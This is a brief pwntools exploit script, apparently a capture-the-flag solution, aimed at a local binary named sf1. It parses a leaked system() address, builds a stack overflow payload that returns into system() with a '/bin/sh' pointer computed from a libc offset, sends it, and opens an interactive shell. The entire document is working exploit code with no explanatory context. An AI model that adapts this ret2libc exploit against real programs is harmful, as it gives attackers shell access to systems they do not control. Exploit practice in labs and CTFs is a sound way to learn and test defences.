from pwn import*
p = process('./sf1')
# gadget
#binsh = 0x0804A028
binsh_libc = 0x120c6b
p.recvuntil('system address : ')
system = int(p.recv(10),16)


pay = ''
pay += 'a'*0x88
pay += 'b'*0x4
pay += p32(system)
pay += 'c'*0x4
pay += p32(system+binsh_libc)
p.send(pay)

p.interactive()



